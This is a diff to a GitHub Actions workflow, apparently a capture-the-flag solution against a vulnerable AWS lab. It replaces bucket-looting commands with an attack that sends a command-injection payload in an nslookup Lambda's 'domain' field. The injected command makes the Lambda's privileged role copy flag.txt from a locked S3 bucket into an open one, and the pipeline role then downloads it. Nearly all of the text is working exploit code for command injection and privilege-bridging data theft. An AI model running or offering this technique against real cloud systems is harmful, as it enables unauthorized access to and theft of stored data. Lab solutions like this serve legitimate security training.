@@ -21,17 +21,30 @@ jobs:
 
       - name: Invoke Vulnerable Lambda
         run: |
-          echo "=== LOOTING COMPANION BUCKET 1: platform-bucket-009661764077-us-east-1 ==="
-          aws s3 ls "s3://platform-bucket-009661764077-us-east-1" --recursive || echo "Bucket 1 restricted"
-          mkdir -p loot_1
-          aws s3 sync "s3://platform-bucket-009661764077-us-east-1" ./loot_1/ 2>/dev/null || echo "Sync skipped"
+          API_ID="3q931syi7b"
+          REGION="us-east-1"
+          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
+          
+          SOURCE_BUCKET="codec4f26c862a321ef5"
+          TARGET_BUCKET="site781fe43f26b9eba3"
+          
+          echo "=== 1. USING LAMBDA TO BRIDGE flag.txt TO OPEN BUCKET ==="
+          # The Lambda (lambdaRole) reads flag.txt from the locked bucket 
+          # and copies it into the open companion bucket where cicdRole has access!
+          PAYLOAD="{\"domain\": \"127.0.0.1; aws s3 cp s3://${SOURCE_BUCKET}/flag.txt s3://${TARGET_BUCKET}/flag.txt\"}"
+          
+          curl -s -X POST "$URL" \
+            -H "Content-Type: application/json" \
+            -d "$PAYLOAD"
           
           echo ""
-          echo "=== LOOTING COMPANION BUCKET 2: site781fe43f26b9eba3 ==="
-          aws s3 ls "s3://site781fe43f26b9eba3" --recursive || echo "Bucket 2 restricted"
-          mkdir -p loot_2
-          aws s3 sync "s3://site781fe43f26b9eba3" ./loot_2/ 2>/dev/null || echo "Sync skipped"
+          echo "=== 2. WAITING 3 SECONDS FOR S3 SYNC ==="
+          sleep 3
+          
+          echo "=== 3. DOWNLOADING THE REAL FLAG DIRECTLY ==="
+          # Your cicdRole downloads the bridged file from the companion bucket with zero blocks!
+          aws s3 cp "s3://${TARGET_BUCKET}/flag.txt" ./real_flag.txt
           
           echo ""
-          echo "=== PRINTING ALL FOUND FILES ==="
-          find ./loot_1 ./loot_2 -type f -exec echo "FILE: {}" \; -exec cat {} \; -exec echo "" \;
+          echo "=== 4. BEHOLD THE GLORIOUS FLAG ==="
+          cat ./real_flag.txt
